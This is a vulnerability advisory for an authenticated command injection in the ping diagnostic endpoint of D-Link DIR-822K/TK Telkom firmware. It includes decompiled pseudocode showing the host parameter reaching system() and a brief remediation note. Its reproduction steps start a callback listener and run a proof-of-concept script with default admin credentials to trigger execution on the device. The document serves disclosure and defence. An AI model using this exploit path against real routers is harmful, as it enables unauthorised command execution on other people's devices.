# DLINK-DIR-822K-TK-V002: Ping diagnostic host command injection

**Product:** D-Link DIR-822K/TK Telkom
**Firmware:** V1.00 Telkom, build 2025-06-24 (latest package in D-Link's directory; product is EOL)
**CWE:** CWE-78
**CVSS:** 7.2 (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H)
**Authentication:** Administrator authentication is required.
**Affected entry:** POST /boafrm/formPingDiagnosticRun, parameter host

An authenticated administrator can inject shell syntax and execute arbitrary operating-system commands with the Web service's privileges.

The host parameter is interpolated into a shell command without complete shell escaping and reaches system().

## Shared emulation

Use the shared model environment: [dir-822k-tk emulator](../../../emu/dir-822k-tk/README.md).
Start it exactly as described there, then return to this case directory.

## Reproduction

1. Start the shared emulator and wait for its documented readiness check.
2. In a second terminal on the host, start this callback listener:

```sh
python3 -m http.server 8000 --bind 192.168.223.2
```

3. From this case directory, run:

```sh
python3 poc.py --target http://192.168.223.1 --username admin --password admin --callback 192.168.223.2:8000
```

Observe the callback or crash indicator described in the shared emulator README. The included `validation.log` records the internal self-test evidence.

## Root cause and attack path

The attack starts at the authenticated `POST /boafrm/formPingDiagnosticRun` handler. The handler reads the request's `host` field with `sub_40F4CC`, chooses the ping variant from `ipVer`, and formats both values into the local command buffer `v9`. It then passes that complete string to `system()`.

The input is not treated as a single hostname and shell metacharacters are not removed or escaped. An administrator-supplied value such as a value containing command separators or command substitution therefore changes the shell command instead of remaining a ping argument. The callback in the PoC is the observable result of execution by the Web service's process.

The relevant pseudocode is embedded below. It shows the request value being read, transformed or copied, and reaching the vulnerable sink.

```c
/* IDA pseudocode excerpt; addresses are from the analyzed firmware. */
  18161: //----- (00419B74) --------------------------------------------------------
  18162: int   sub_419B74(unsigned int *a1, int a2)
  18163: {
  18164:   const char *v4; // $s0
  18165:   int v5; // $s2
  18166:   int v7; // $v0
  18167:   const char *v8; // $a2
  18168:   char v9[260]; // [sp+18h] [-104h] BYREF
  18169: 
  18170:   memset(v9, 0, 256);
  18171:   v4 = (const char *)sub_40F4CC(a1, (int)"host", (int)"");
  18172:   v5 = sub_40F4CC(a1, (int)"ipVer", (int)"");
  18173:   if ( !v4 || *v4 )
  18174:   {
  18175:     unlink("/var/tmp/pingDiagnosticResult");
  18176:     v7 = atoi(v5);
  18177:     v8 = "";
  18178:     if ( v7 != 4 )
  18179:       v8 = "6";
  18180:     sprintf(v9, "ping%s %s -w 5 &> /var/tmp/pingDiagnosticResult", v8, v4);
  18181:     fprintf(stderr, "%s\n", v9);
  18182:     system(v9);
  18183:     return 0;
  18184:   }
  18185:   else
  18186:   {
  18187:     strcpy(a2, "Host is Error!");
  18188:     return -1;
  18189:   }
  18190: }
  18191: // 480050: using guessed type int   unlink(unsigned int);
  18192: // 4800E0: using guessed type int fprintf(unsigned int, const char *, ...);
  18193: // 480290: using guessed type int   memset(unsigned int, unsigned int, unsigned int);
  18194: // 4803D0: using guessed type int   strcpy(unsigned int, unsigned int);
  18195: // 480420: using guessed type int   system(unsigned int);
  18196: // 4804B0: using guessed type int   atoi(unsigned int);
  18197: // 4807A0: using guessed type int sprintf(unsigned int, const char *, ...);
  18198: // 493CFC: using guessed type int stderr;
  18199:
```

## Suggested remediation

Validate and constrain the affected input before invoking the privileged operation.

